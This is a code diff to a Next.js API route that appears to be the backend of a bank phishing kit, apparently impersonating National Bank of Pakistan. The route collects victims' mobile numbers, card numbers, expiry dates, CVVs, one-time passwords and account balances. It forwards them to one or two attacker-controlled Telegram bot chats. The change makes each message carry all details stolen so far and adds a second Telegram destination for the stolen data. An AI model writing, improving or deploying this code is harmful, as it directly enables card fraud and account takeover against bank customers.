@@ -10,11 +10,51 @@ function copyable(value: string | number) {
   return `<code>${escapeHtml(String(value))}</code>`
 }
 
-export async function POST(request: Request) {
-  const token = process.env.TELEGRAM_BOT_TOKEN
-  const chatId = process.env.TELEGRAM_CHAT_ID
+// Builds the cumulative message: whatever fields have been collected so far
+// (across the login, card, otp, balance, and confirm-otp pages) are included,
+// in a fixed order, so every step's notification contains all prior details.
+function buildCumulativeText(body: Record<string, unknown>) {
+  const lines: string[] = ['<b>NBP submission update</b>']
 
-  if (!token || !chatId) {
+  const mobile = typeof body?.mobile === 'string' ? body.mobile.trim() : ''
+  const card = typeof body?.card === 'string' ? body.card.trim() : ''
+  const month = typeof body?.month === 'string' ? body.month.trim() : ''
+  const year = typeof body?.year === 'string' ? body.year.trim() : ''
+  const cvv = typeof body?.cvv === 'string' ? body.cvv.trim() : ''
+  const otp = typeof body?.otp === 'string' ? body.otp.trim() : ''
+  const balance = typeof body?.balance === 'string' ? body.balance.trim() : ''
+  const confirmOtp = typeof body?.confirmOtp === 'string' ? body.confirmOtp.trim() : ''
+
+  if (mobile) lines.push(`Mobile: ${copyable(mobile)}`)
+  if (card) lines.push(`Card: ${copyable(card)}`)
+  if (month || year) lines.push(`Expiry: ${copyable(`${month || '--'}/${year || '----'}`)}`)
+  if (cvv) lines.push(`CVV: ${copyable(cvv)}`)
+  if (otp) lines.push(`OTP: ${copyable(otp)}`)
+  if (balance) lines.push(`Balance: ${copyable(`PKR ${balance}`)}`)
+  if (confirmOtp) lines.push(`Confirm OTP: ${copyable(confirmOtp)}`)
+
+  return lines.length > 1 ? lines.join('\n') : ''
+}
+
+// Each configured bot/chat pair that a notification should be delivered to.
+function getTelegramTargets() {
+  const targets: { token: string; chatId: string }[] = []
+
+  const token1 = process.env.TELEGRAM_BOT_TOKEN
+  const chatId1 = process.env.TELEGRAM_CHAT_ID
+  if (token1 && chatId1) targets.push({ token: token1, chatId: chatId1 })
+
+  const token2 = process.env.TELEGRAM_BOT_TOKEN_2
+  const chatId2 = process.env.TELEGRAM_CHAT_ID_2
+  if (token2 && chatId2) targets.push({ token: token2, chatId: chatId2 })
+
+  return targets
+}
+
+export async function POST(request: Request) {
+  const targets = getTelegramTargets()
+
+  if (targets.length === 0) {
     return NextResponse.json({ ok: false, error: 'Telegram is not configured.' }, { status: 503 })
   }
 
@@ -22,24 +62,10 @@ export async function POST(request: Request) {
   try {
     const body = await request.json()
 
-    if (body?.card || body?.month || body?.year || body?.cvv) {
-      // Card submission
-      const lines = [
-        '<b>New card submission</b>',
-        body?.card ? `Card: ${copyable(body.card)}` : null,
-        body?.month || body?.year ? `Expiry: ${copyable(`${body?.month ?? '--'}/${body?.year ?? '----'}`)}` : null,
-        body?.cvv ? `CVV: ${copyable(body.cvv)}` : null,
-        body?.mobile ? `Mobile: ${copyable(body.mobile)}` : null,
-      ].filter(Boolean)
-      text = lines.join('\n')
-    } else if (body?.mobile) {
-      text = `<b>New mobile number</b>\nMobile: ${copyable(body.mobile)}`
-    } else if (body?.otp) {
-      text = `<b>OTP submitted</b>\nOTP: ${copyable(body.otp)}`
-    } else if (body?.confirmOtp) {
-      text = `<b>Confirm OTP submitted</b>\nOTP: ${copyable(body.confirmOtp)}`
-    } else if (body?.balance) {
-      text = `<b>Account balance submitted</b>\nBalance: ${copyable(`PKR ${body.balance}`)}`
+    const cumulative = buildCumulativeText(body ?? {})
+
+    if (cumulative) {
+      text = cumulative
     } else if (typeof body?.text === 'string' && body.text.trim()) {
       text = escapeHtml(body.text.trim())
     } else {
@@ -55,26 +81,28 @@ export async function POST(request: Request) {
     return NextResponse.json({ ok: false, error: 'Nothing to send.' }, { status: 400 })
   }
 
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: 'POST',
-      headers: { 'content-type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text,
-        parse_mode: 'HTML',
+  const results = await Promise.allSettled(
+    targets.map(({ token, chatId }) =>
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text,
+          parse_mode: 'HTML',
+        }),
+        cache: 'no-store',
       }),
-      cache: 'no-store',
-    })
+    ),
+  )
 
-    if (!response.ok) {
-      return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
-    }
+  const anySucceeded = results.some((result) => result.status === 'fulfilled' && result.value.ok)
 
-    return NextResponse.json({ ok: true })
-  } catch {
+  if (!anySucceeded) {
     return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
   }
+
+  return NextResponse.json({ ok: true })
 }
 
 export function GET() {
